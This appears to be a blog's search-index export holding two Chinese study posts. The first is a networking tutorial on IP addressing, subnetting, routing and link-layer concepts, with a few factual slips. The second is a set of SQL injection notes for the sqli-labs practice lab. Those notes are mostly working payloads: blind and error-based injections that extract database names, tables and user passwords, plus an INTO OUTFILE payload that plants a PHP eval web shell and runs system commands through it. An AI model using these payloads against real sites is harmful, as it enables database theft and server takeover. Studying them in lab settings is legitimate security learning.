<li>网络层的功能是向传输层提供数据包服务。网络中通信的两个计算机，通信前不需要建立连接，网络中的路由器为每个数据包单独选择转发路径。网络层不提供服务质量的承诺，即路由器直接丢掉传输过程中出错的数据包，也不判断是否重复，也不确保是否按照发送顺序到达终点。</li>
</ul>
<h3 id="（1）IP地址"><a href="#（1）IP地址" class="headerlink" title="（1）IP地址"></a>（1）IP地址</h3><h4 id="1-MAC地址和IP地址"><a href="#1-MAC地址和IP地址" class="headerlink" title="1.MAC地址和IP地址"></a>1.MAC地址和IP地址</h4><ul>
<li>IP地址就是给每一个连接在Internet上的主机分配一个32位的地址。IP地址可以用来定位网络中的计算机和网络设备。</li>
<li>生产网卡时，48字节的MAC地址就已经被固化在网卡的ROM中了，因此MAC地址也叫硬件地址或者物理地址。当这块网卡插入到某台计算机后，网卡的MAC地址就成了这台计算机的MAC地址了。</li>
<li>数据包的目标IP地址决定了数据包最终跳到哪个计算机，而MAC地址决定了该数据包下一跳由哪个设备接收，这个设备不一定是终点。</li>
</ul>
<h4 id="2-IP地址的分类"><a href="#2-IP地址的分类" class="headerlink" title="2.IP地址的分类"></a>2.IP地址的分类</h4><blockquote>
<p>A类地址：IP地址最高位为0，子网掩码255.0.0.0，第一部分取值范围1-126(127作为保留网段)</p>
<p>主机数量为256x256x256-2</p>
<p>B类地址：IP地址最高位为10，子网掩码255.255.0.0，第一部分取值范围128-191</p>
<p>主机数量为256x256-2</p>
<p>C类地址：IP地址最高位为110，子网掩码255.255.255.0，第一部分取值范围192-223</p>
<p>主机数量为256-2</p>
<p>用于多播的地址：</p>
<p>D类地址(多播地址)：IP地址最高位为1110，没有子网掩码，第一部分取值范围224-239</p>
<p>E类地址：IP地址最高位为1111，没有子网掩码，第一部分取值范围240-254</p>
</blockquote>
<ul>
<li><p>主机ID全是0的地址为网络地址，而主机ID全为1的地址为广播地址，代表该网段的所有计算机，如果给主机ID全为1的计算机发送数据包，计算机将产生一个数据链路层广播帧，发送到全网段全部计算机。</p>
<p>1270.0.1：回送地址，指本地机一旦使用回送地址发送数据，协议软件立即返回，不需要任何网络传输。如果使用ping命令可以ping通，则说明TCP/IP协议栈工作正常，即使没有网卡也可以ping通。</p>
<p><img src="https://i.loli.net/2021/11/15/mxbEDZBy2NWwTL9.jpg" alt="img"></p>
</li>
</ul>
<h4 id="3-子网掩码"><a href="#3-子网掩码" class="headerlink" title="3.子网掩码"></a>3.子网掩码</h4><ul>
<li><p>子网掩码又叫网络掩码、地址掩码。将某个IP地址划分成网络地址和主机地址两个部分。</p>
</li>
<li><p>例如一个计算机的IP地址是131.107.41.6，子网掩码是255.255.255.0，则所在网段是131.107.41.0(将主机部分归零就是该主机所在网段)。该计算机和远程计算机通信时，只要目标IP地址的前三部分是131.107.41，就认为远程计算和该计算机在同一网段。</p>
<p>若计算机的IP地址是131.107.41.6，子网掩码是255.0.0.0，该计算机所在的网段是131.0.0.0。该计算机与远程计算机通信，只要目标IP地址的第一部分是131就认为远程计算机与该计算机在同一个网段。</p>
</li>
</ul>
<h4 id="4-公网地址和私网地址"><a href="#4-公网地址和私网地址" class="headerlink" title="4.公网地址和私网地址"></a>4.公网地址和私网地址</h4><p>公网地址：公网地址的分配和管理由因特网信息中心(Inter NIC)负责，各级ISP使用的公网地址都需要想Inter NIC提出申请，然后统一发放，这样就能确保地址块不冲突。</p>
<p>私有地址：创建IP寻址方案的同时也创建了私有IP地址。这些地址可以被用于私有网络，在Internet上没有这些IP地址，Internet上的路由也没有到私有网络的路由，所以在Internet不能访问这些私网地址。</p>
<p>(1)A类：10.0.0.0 子网掩码255.0.0.0 (1个A类网络)</p>
<p>(2)B类：172.16.0.0-172.31.0.0 子网掩码255.255.0.0 (16个B类网络)</p>
<p>(3)C类：192.168.0.0-192.168.255.0 子网掩码255.255.255.0 (256个C类网络)</p>
<h4 id="5-子网划分"><a href="#5-子网划分" class="headerlink" title="5.子网划分"></a>5.子网划分</h4><ul>
<li>借用现有网段的主机位做网络位，划分出多个子网，打破IP地址分类所限制的地址块，使IP地址的数量和网络中的计算机数量更匹配。子网划分的主要任务：一是确定子网掩码的长度，二是确定子网中第一个和最后一个可用的IP地址。</li>
</ul>
<h5 id="1-等长子网划分"><a href="#1-等长子网划分" class="headerlink" title="(1)等长子网划分"></a>(1)等长子网划分</h5><p>用一个C类网络举例，一个公司有200台计算机，分为两个部门，一个部门100台。给这200台计算机分配一个C类网络192.168.0.0，子网掩码为255.255.255.0，这个C类网段等分成两个子网。</p>
<p>将IP地址的第四部分写成二进制的形式。子网掩码的位数向后移动一位，这样C类地址主机ID的第一位就变成了网络位，该位为0的是子网A，为1的是子网B。子网掩码都是255.255.255.128.子网A的范围是192.168.0.1-192.168.0.126，而192.168.0.0和192.168.0.127因为主机位全为0或全为1而不能用。子网B的范围是192.168.0.129-192.168.0.254，同理192.168.0.128和192.168.0.255不能用。</p>
<p>等分成两个子网是将第四部分后移一位，等分四个子网是后移两位。</p>
<p><img src="https://i.loli.net/2021/11/15/BvySrRNdtzkbqpo.jpg" alt="img"></p>
<p><img src="https://i.loli.net/2021/11/15/RAQkXw4uCiW31pZ.jpg" alt="img"></p>
<h5 id="2-变长子网划分"><a href="#2-变长子网划分" class="headerlink" title="(2)变长子网划分"></a>(2)变长子网划分</h5><p>如果每个子网中的计算机数量不一样，就需要将该网段划分成地址空间不等的子网，这就是变长子网划分。</p>
<p>比如一个C类网络192.168.0.0，子网掩码为255.255.255.0，需要将该网络划分成5个网段以满足网络需求；该网络中有三个交换机，分别连接20,50,100台计算机，路由器之间的连接也需要地址，这两个地址也是网段，这样网络中有五个网段。</p>
<p>如图，将子网掩码为255.255.255.0的192.168.0.0网段的主机位从0到255画一条直线，从128到255的地址空间给拥有100台计算机的网段比较合适，该子网地址的范围是原来网络的1/2，子网掩码往后移一位，写成十进制形式就是255.255.255.128.第一个能用的地址是192.168.0.129，最后一个是192.168.0.254</p>
<p>64-128的地址空间给拥有50台计算机的网段，该子网的地址范围是原来的1/2*1/2，子网掩码往后移两位。写成十进制就是255.255.255.192.第一个能用的地址是192.168.0.65，最后一个地址是192.168.0.126</p>
<p>32-64的地址空间给拥有20台计算机的网段，该子网地址范围是原来的1/2* 1/2 *1/2子网掩码往后移三位，写成十进制就是255.255.224,。第一个能用的地址是192.168.0.33，最后一个地址是192.168.0.62</p>
<p><img src="https://i.loli.net/2021/11/16/Vld7HpPSWrGMgmf.jpg" alt="img"></p>
<h5 id="3-超网"><a href="#3-超网" class="headerlink" title="(3)超网"></a>(3)超网</h5><p>将主机位当做网络位划分成多个子网，将多个网段合并成一个大网段叫超网，把网络位当主机位。</p>
<h3 id="（2）静态路由和动态路由"><a href="#（2）静态路由和动态路由" class="headerlink" title="（2）静态路由和动态路由"></a>（2）静态路由和动态路由</h3><ul>
<li><p>网络通畅的条件：网络中的计算机A想要实现和计算机B的通信，沿途所有路由器都必须有到达B网段的路由，而计算机B给计算机A返回数据包，途径的所有路由器都必须有到达A网段的路由。</p>
<p>在计算机A上使用ping命令，如果沿途任何一个路由器缺少到达B网段的路由，则路由器返回数据包显示目标主机不可到达，如果数据包可以达到B但是某个路由器缺少到达A网段的路由，就意味着数据包不能返回A计算机，此时A上显示请求超时。</p>
</li>
</ul>
<h4 id="1-静态路由"><a href="#1-静态路由" class="headerlink" title="1.静态路由"></a>1.静态路由</h4><p>全网通信(网络中任意两个节点都能通信)要求每个路由的路由表中都必须有到达所有网段的路由。路由器只知道自己的直连路由；管理人员需要人工添加没有直连的网段到这些网段的路由。</p>
<p>如图有A,B,C,D,四个网段，计算机和路由器接口的IP地址已经标出，网络中路由器R1,R2,R3如何添加路由才能使网络通畅？</p>
<p>R1路由器直连A,B两个网段，没有直连C,D网段，需要添加到C,D网段的路由。</p>
<p>R2路由器直连B,C两个网段，没有直连A,D网段，需要添加到A,D网段的路由。</p>
<p>R3路由器直连C,D两个网段，没有直连A,B网段，需要添加到A,B网段的路由。</p>
<p><img src="https://i.loli.net/2021/11/16/xjyb8apPghXcvnz.jpg" alt="img"></p>
<p>下一跳：在可触及的网段范围内距离最远的IP地址。比如R1添加C,D网段，R1可触及A,B网段，在到C,D方向上自己可触及最远的IP地址是172.16.0.2.</p>
<p>如果转发到目标网络经过一个点到点链路，还可以用这种格式添加路由：比如在R2路由器添加到子网掩码为255.255.255.0的192.168.1.0网段的路由可以写成  R2(config)#ip route 192.168.1.0 255.255.255.0 serial 2/0(出口)</p>
<p>如果路由器之间是以太网连接(不是直接连接)则添加路由时最好写下一跳地址。以太网中可以连接多个计算机或者路由器，如果添加路由的下一跳不写地址，就无法判断下一跳由哪一个设备接收。</p>
<p><img src="https://i.loli.net/2021/11/16/SFrOyPKU8iNGXRb.jpg" alt="img"></p>
<h4 id="2-动态路由"><a href="#2-动态路由" class="headerlink" title="2.动态路由"></a>2.动态路由</h4><p>上面讲解的在路由器上人工添加的路由是静态路由。如果网络有变化,如增加了一个网段，需要在网络中的所有没有直连的路由器上添加新网段的路由;如果网络中某个网络改成了新的网段，需要在网终中的路由器上删除到原来网段的路由,添加新网段的路由;如果网络中某条链路断了，静态路由依然会把数据包转发到该链路，这就造成通信故障。</p>
<p>总之，静态路由不能随网络的变化白动调整路由器的路由表,并且在网络规模比较大的情况下，手动添加路由表是一件很麻烦的事情.有没有办法让路由器自动检测到网络中有哪些网段，自己选择到各个网段的最佳路径?有,那就是下面要讲的动态路由。</p>
<p>动态路由就是配置网络中的路由器运行动态路由协议,路由表项是通过相互连接的路由器之间交换彼此信息，然后按照一定的算法优化出来的，而这些路由信息是在一定时间间隙里不断更新的,以适应不断变化的网络,随时获得最优的寻径效果。</p>
<p>动态路由协议的特点：(1）能够知道有哪些邻居路由器。（2）能够学习到网络中有哪些网段。（3）能够学习到到某个网段的所有路径。(4）能够从众多的路径中选择最佳的路径。(5）能够维护和更新路由信息。</p>
<h4 id="3-RIP"><a href="#3-RIP" class="headerlink" title="3.RIP"></a>3.RIP</h4><p>路由信息协议(RIP)是一个真正的距离矢量路由选择协议。它每隔30秒就送出自己完整的路由表到所有激活的接口，RIP只使用跳数来决定到达远程网络的最佳方式，默认允许最大跳数为15，也就是说16跳的距离被认为是不可到达的。</p>
<h3 id="（3）网络层协议"><a href="#（3）网络层协议" class="headerlink" title="（3）网络层协议"></a>（3）网络层协议</h3><blockquote>
<p>1.IP——负责将数据包发送到目的地，是多方协议，包括发送端，接收端和路由器，这些设备都按照IP协议来处理转发数据包</p>
<p>2.ICMP(Internet控制报文协议)——封装在IP数据报内，用于在网络主机和路由器间传递控制消息(网络不通、主机是否可达、路由是否可用)</p>
<p>3.ARP(地址解析协议)——在计算机与目标计算机通信之前，需要解析目标计算机的MAC地址(同一网段通信)或网关的MAC地址(跨网段通信)</p>
<p>4.IGMP(Internet组管理协议)——是Internet协议家族中的一个多播协议。该协议运行在主机和多播路由器之间，是网络层协议</p>
</blockquote>
<h2 id="四、数据链路层"><a href="#四、数据链路层" class="headerlink" title="四、数据链路层"></a>四、数据链路层</h2><ul>
<li><p>链路加上数据链路层协议才能实现数据传输。数据链路层协议负责把数据从链路的一段发送到链路另一端。数据链路层协议的甲方和乙方是同一链路上的设备。 </p>
</li>
<li><p>数据链路层把网络层交下来的数据封装成帧发送到链路上，以及把接受的帧中的数据取出并上交给网络层。</p>
</li>
</ul>
<h4 id="（1）数据链路层的三个基本问题："><a href="#（1）数据链路层的三个基本问题：" class="headerlink" title="（1）数据链路层的三个基本问题："></a>（1）数据链路层的三个基本问题：</h4><h4 id="1-封装成帧"><a href="#1-封装成帧" class="headerlink" title="1.封装成帧"></a>1.封装成帧</h4><ul>
<li><p>将网络层交下来的IP数据报前后添加首部尾部，这样就构成了一个帧。</p>
<p>MTU为1500字节</p>
<p><img src="https://i.loli.net/2021/11/10/3VNcgbYqkzvatD2.png" alt="帧"></p>
</li>
</ul>
<h4 id="2-透明传输"><a href="#2-透明传输" class="headerlink" title="2.透明传输"></a>2.透明传输</h4><ul>
<li>帧开始符和帧结束符最好是不会出现在帧的数据部分的字符。比如代码SOH代表帧开始符，EOT代表帧结束符。</li>
<li>发送端的数据链路层在数据中出现控制字符“SOH”或“EOT”的前面插入字符“ESC”。接收端的数据链路层在将数据送往网络层之前删除插入的转义字符(如果转义字符也出现在数据中那么在转义字符前再加入一个转义字符，删除时删除第一个)</li>
</ul>
<h4 id="3-差错控制"><a href="#3-差错控制" class="headerlink" title="3.差错控制"></a>3.差错控制</h4><ul>
<li>比特在传输过程中可能会产生差错：1会变成0,0会变成1，这叫比特差错。</li>
<li>CRC：循环沉余检验(差错检验技术)</li>
<li>FCS：帧效验序列(包含于传输的帧中用于检测错误的一类信息)</li>
</ul>
<p>在数据链路层，发送端的FCS的生成和接收端的CRC都是由硬件完成，处理很迅速。</p>
<h3 id="（2）点到点通信的数据链路："><a href="#（2）点到点通信的数据链路：" class="headerlink" title="（2）点到点通信的数据链路："></a>（2）点到点通信的数据链路：</h3><ul>
<li><p>点到点信道通信指的是一条链路上就一个发送端和接收端的信道，通常用在广域网链路上。或者家庭用户使用调制调节器通过电话线拨号连接ISP。</p>
</li>
<li><p>高级数据链路控制(HDLC)为之前流行的数据链路层协议，而现在点到点协议(PPP)是目前使用最广泛的数据链路层协议。</p>
<h4 id="PPP协议的特点："><a href="#PPP协议的特点：" class="headerlink" title="PPP协议的特点："></a>PPP协议的特点：</h4><blockquote>
<ul>
<li>简单 -&gt; 接受端收到帧就CRC正确就留下，不正确丢弃</li>
<li>封装成帧 -&gt; 规定特殊字符为帧定界符</li>
<li>透明传输 -&gt; 数据中出现和定界符一样的帧组合时采用措施解决</li>
<li>差错检测 -&gt; 接收端收到的帧检测出差错就立即丢弃</li>
<li>支持多种网络层协议 -&gt; 同一条物理链路上，支持多种网络层协议(IP/IPX)</li>
<li>多种类型链路 -&gt; 串行的、并行的、同步或异步的、低速的或高速的、电的或光的，点对点链路</li>
<li>检测连接状态 -&gt; 自动检测链路是否处于工作状态</li>
<li>最大传送单元 -&gt; 如果高层协议发送的分组过长超过MTU，则丢弃，返回错误</li>
<li>网络层地址协商 -&gt; 1.提供一种机制使通信的两个网络层实体协商配置彼此的网络层地址。2.使用调制解调器拨号访问Internet，ISP会给拨号计算机分配一个公网地址</li>
<li>数据压缩协商 -&gt; PPP并不要求将数据压缩算法进行标准化</li>
</ul>
</blockquote>
</li>
</ul>
<h3 id="（3）广播信道的数据链路："><a href="#（3）广播信道的数据链路：" class="headerlink" title="（3）广播信道的数据链路："></a>（3）广播信道的数据链路：</h3><ul>
<li>早期的局域网使用同轴电缆进行组网，总线拓扑。计算机A给计算机B发送一个帧，同轴电缆会把承载该帧的数字信号传送到所有终端，链路上所有计算机都能收到，所以称为广播信道。</li>
<li>要在这样一个广播信道实现点到点通信，就需要给发送的帧添加原地址和目标地址，仅当帧的目标地址和计算机网卡的MAC地址相同时，网卡才会接受该帧，对于不是给自己的帧则丢失。</li>
<li>广播信道上，链路上同时传输多个计算机的信号时会产生信号的干扰，为了避免该情况，就需要一种数据链路层协议，CSMA/CD协议，以太网就是指使用该协议的网络。</li>
</ul>
<h3 id="（4）集线器、网桥、交换机"><a href="#（4）集线器、网桥、交换机" class="headerlink" title="（4）集线器、网桥、交换机"></a>（4）集线器、网桥、交换机</h3><h4 id="1-集线器：集线器和网线一样工作在物理层，和网线一样只是将数字信号发送到其他端口。-集线器组建的以太网中的计算机带宽共享，数量越多，分下来的带宽越低"><a href="#1-集线器：集线器和网线一样工作在物理层，和网线一样只是将数字信号发送到其他端口。-集线器组建的以太网中的计算机带宽共享，数量越多，分下来的带宽越低" class="headerlink" title="1.集线器：集线器和网线一样工作在物理层，和网线一样只是将数字信号发送到其他端口。(集线器组建的以太网中的计算机带宽共享，数量越多，分下来的带宽越低)"></a>1.集线器：集线器和网线一样工作在物理层，和网线一样只是将数字信号发送到其他端口。(集线器组建的以太网中的计算机带宽共享，数量越多，分下来的带宽越低)</h4><p><img src="https://i.loli.net/2021/11/10/KArLBGO32uoeHTY.jpg" alt="F1D7BD3498BB6052ABA6D7A1CB88C111"></p>
<h4 id="2-网桥：多个集线器连接组建成一个大的以太网，会形成一个大的冲突域-一个集线器中一台计算机发信号时，另一个集线器里其他所有计算机都不能通信-，所以出现了网桥，将一个大冲突域划分为多个小冲突域。"><a href="#2-网桥：多个集线器连接组建成一个大的以太网，会形成一个大的冲突域-一个集线器中一台计算机发信号时，另一个集线器里其他所有计算机都不能通信-，所以出现了网桥，将一个大冲突域划分为多个小冲突域。" class="headerlink" title="2.网桥：多个集线器连接组建成一个大的以太网，会形成一个大的冲突域(一个集线器中一台计算机发信号时，另一个集线器里其他所有计算机都不能通信)，所以出现了网桥，将一个大冲突域划分为多个小冲突域。"></a>2.网桥：多个集线器连接组建成一个大的以太网，会形成一个大的冲突域(一个集线器中一台计算机发信号时，另一个集线器里其他所有计算机都不能通信)，所以出现了网桥，将一个大冲突域划分为多个小冲突域。</h4><p><img src="https://i.loli.net/2021/11/10/q6NlsKwtcP2YiBJ.jpg" alt="047B09868EEC3840DF7F864A755130BE"></p>
<h4 id="3-多接口网桥-gt-交换机：随着技术的发展，网桥的接口增多，就直接与计算机相连了，就成了交换机。-每个端口独享带宽，全双工通信并不再使用CSMA-CD协议"><a href="#3-多接口网桥-gt-交换机：随着技术的发展，网桥的接口增多，就直接与计算机相连了，就成了交换机。-每个端口独享带宽，全双工通信并不再使用CSMA-CD协议" class="headerlink" title="3.多接口网桥-&gt;交换机：随着技术的发展，网桥的接口增多，就直接与计算机相连了，就成了交换机。(每个端口独享带宽，全双工通信并不再使用CSMA/CD协议)"></a>3.多接口网桥-&gt;交换机：随着技术的发展，网桥的接口增多，就直接与计算机相连了，就成了交换机。(每个端口独享带宽，全双工通信并不再使用CSMA/CD协议)</h4><p><img src="https://i.loli.net/2021/11/10/YFAiDwN3IhyuVJ5.jpg" alt="6690458F8F238D0BB58D70F38349CFA9"></p>
<h2 id="五、物理层"><a href="#五、物理层" class="headerlink" title="五、物理层"></a>五、物理层</h2><h3 id="（1）物理层基本概念"><a href="#（1）物理层基本概念" class="headerlink" title="（1）物理层基本概念"></a>（1）物理层基本概念</h3><ul>
<li><p>数据的传输离不开通信技术，也就是如何在各种介质（双绞线、同轴电缆、光纤和无线）中更快的传输数字信号和模拟信号。涉及的通信的概念有模拟信号、数字信号、全双工通信、半双工通信、单工通信、常用编码方式和调制方式等。</p>
</li>
<li><p>物理层包括以下四个方面的定义</p>
<blockquote>
<p>1.机械特性：常用的各种规格接插部件都有严格的标准化规定</p>
<p>2.电气特性：电压范围</p>
<p>3.功能特性：指明某一电平的电压表示的意义</p>
<p>4.过程特性：指明在信号线上进行二进制比特流传输的一组操作过程，使比特流传输得以完成</p>
</blockquote>
</li>
</ul>
<h3 id="（2）数据通信模型"><a href="#（2）数据通信模型" class="headerlink" title="（2）数据通信模型"></a>（2）数据通信模型</h3><ul>
<li><p>信息：通信的目的是传输信息，文字，图像，视频等</p>
<p>数据：信息传输前进行编码，编码后的信息变为数据</p>
<p>信号：数据在通信线路上传递需要变成电信号或光信号</p>
</li>
</ul>
<h4 id="1-局域网通信模型"><a href="#1-局域网通信模型" class="headerlink" title="1.局域网通信模型"></a>1.局域网通信模型</h4><p>使用集线器或交换机组建局域网，使计算机A,B能够通信，信息变为数字信号传输。</p>
<p><img src="https://i.loli.net/2021/11/10/ZJ3fd2XtK6z4N1Y.jpg" alt="7E739FE6BFB3D2E587357A8318C3EB84"></p>
<h4 id="2-广域网通信模型"><a href="#2-广域网通信模型" class="headerlink" title="2.广域网通信模型"></a>2.广域网通信模型</h4><p>通过机器将数字比特流转换。</p>
<p><img src="https://i.loli.net/2021/11/10/ntXHMlpVQm1yaG7.jpg" alt="F961163A5DE281C3676FE90EEDEC3A8D"></p>
<h3 id="（3）单工、半双工、全双工通信"><a href="#（3）单工、半双工、全双工通信" class="headerlink" title="（3）单工、半双工、全双工通信"></a>（3）单工、半双工、全双工通信</h3><p>1.单工通信：又称单向通信，即一个信号只能向一个方向传输，任何时候都不能改变信号的传输方向。比如无线电广播和有线电视广播。</p>
<p>2.半双工通信：又称双相交替通信，信号可以双向传输但是必须交替进行，例如对讲机，A端说话B端只能听不能说。</p>
<p>3.全双工通信：又称双向同时通信，信号可以同时双向传递，比如打电话等。</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2021/10/15/%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h2><p>尝试1‘ / 1’‘ 等，将and前的引号闭合</p>
<h2 id="猜测长度"><a href="#猜测长度" class="headerlink" title="猜测长度:"></a>猜测长度:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;11--+</span><br></pre></td></tr></table></figure>

<p>页面返回有数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;12--+</span><br></pre></td></tr></table></figure>

<p>页面无结果返回则当前数据库名称长度为: 12</p>
<h2 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)) &gt;100--+</span><br></pre></td></tr></table></figure>

<p>根据二分法判断</p>
<p><code>SUBSTR(str,pos)</code>:  pos开始的位置，—直截取到最后</p>
<p><code>SUBSTR(str,pos,len)</code>:  从 pos开始的位置，截取len个字符</p>
<p><code>substr(string ,1,3)</code>: 取string左边第1位置起，3字长的字符串。所以结果为: str</p>
<p><code>substr(string, -1,3)</code>: 取string右边第1位置起，3字长的字符串。显然右边第一位置起往右不够3字长。结果只能是: g</p>
<p><code>substr(string,-3,3)</code>: 取string右边第3位置起，字长的字符串,结果为: ing</p>
<p><code>?id=1&#39; and ascii(substr(database(),1,1))=107--+</code></p>
<p> 页面返回有数据</p>
<p><code>?id=1&#39; and ascii(substr(database(),2,1))=97--+</code> </p>
<p>页面返回有数据</p>
<p>当前数据库 第一个字母是k,第二个字母是a…以此类可推得到数据库库名</p>
<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><p><code>?id=1&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101--+</code></p>
<p><code>?id=1&#39; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&#39;e&#39;--+</code></p>
<ul>
<li>left()函数</li>
</ul>
<p><img src="https://i.loli.net/2021/11/10/GbEokJMVlrFcN1X.png" alt="img"></p>
<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><p><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;102--+ </code></p>
<p>爆出列名之后可以再确认一下：</p>
<p><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()limit 2,1),8)=&#39;password&#39;--+</code></p>
<h2 id="爆内容"><a href="#爆内容" class="headerlink" title="爆内容"></a>爆内容</h2><p><code>?id=1&#39;and (ascii(substr(( select password from users limit 0,1),1,1)))=122--+ </code></p>
<p>爆出列名之后可以再确认一下：</p>
<p><code>?id=1&#39; and left((select password from users limit 0,1),4)=&#39;dumb&#39;--+ </code></p>
<p> 页面返回有数据则正确</p>
<h2 id="outfile-sqllab—7"><a href="#outfile-sqllab—7" class="headerlink" title="outfile/ sqllab—7"></a>outfile/ sqllab—7</h2><p>将内容输出到与本页面同步的文件，写入木马</p>
<p><code>?id=1&#39;))  union select 1,&quot;&lt;?php @eval($_GET[&#39;a&#39;]);?&gt;&quot;,3 into outfile &quot;/var/www/html/a.php&quot; --+</code></p>
<p><code>/var/www/html/</code>是web服务器的默认根文件夹，题目的文件都在这</p>
<p>把内容写入a.php后可以通过访问a.php，并通过hackbar给a赋值?a=system(‘ls’);</p>
<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
<h1 id="POST盲注"><a href="#POST盲注" class="headerlink" title="POST盲注"></a>POST盲注</h1><p><img src="https://i.loli.net/2021/11/10/PBvkj87RFrxqGpf.png" alt="屏幕截图 2021-10-06 190904"></p>
<p>用post传参并布尔盲注：</p>
<p><code>uname=admin&#39; and 1=1#&amp; passwd=passwd&#39;#</code>判断是否回显（若不回显则时间盲注）</p>
<p><code>uname=admin&#39; order by 2#&amp; passwd=passwd&#39;#</code>判断列数</p>
<p>post传参注释使用‘#’</p>
<p>爆库名的paylod:</p>
<p><code>uname=-admin&#39; union select 1,group_concat(schema_name) from information_schema.schemata#&amp;passwd=passwd&#39; #</code></p>
<p>uname传参后先注释，然后写&amp;passwd=passwd’，密码的值可以变，uname的值只能为admin</p>
<p>用post传参并时间盲注：</p>
<p>利用<code>if(判断语句,sleep(5),1)</code>若正确页面延迟5秒，若错误将直接刷新</p>
<p>if(left(database(),8)=’security’,1,sleep(5))</p>
<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>updatexml函数是mysql对xml文档数据进行查询和修改的xpath函数，而extractvalue函数比updatexml函数少了一个修改功能，也就是只进行xml文档数据的查询。</p>
<p>updateml的语法是：</p>
<p>updatexml(xml_document,XPathstring,new_value)要求xpath定位是准确的，如果不准确，就会发生错误，要利用的就是这个特性。直接在输入框内拼接语句：<code>updatexml(1,concat(0x7e,database()),0)</code></p>
<p>extractvalue的语法是：</p>
<p>extractvalue(xml_document,XPathstring)。语句：<code>extractvalue(1,concat(0x7e,database()))</code></p>
<h3 id="sqli-lab-17题"><a href="#sqli-lab-17题" class="headerlink" title="sqli lab-17题"></a>sqli lab-17题</h3><p><img src="https://i.loli.net/2021/11/10/reCAm5ltOWR3Qgx.png" alt="报错盲注"></p>
<p>从头开始看，需要传uname和passwd的值，不然进行不下去，下面显示print_r(mysql_error())说明报错注入，则现在需要paylod爆库名：</p>
<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,database()))#</code></p>
<p>爆表名:</p>
<p><code>uname=admin &amp; passwd=password&#39; and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)))#</code></p>
]]></content>
  </entry>
</search>
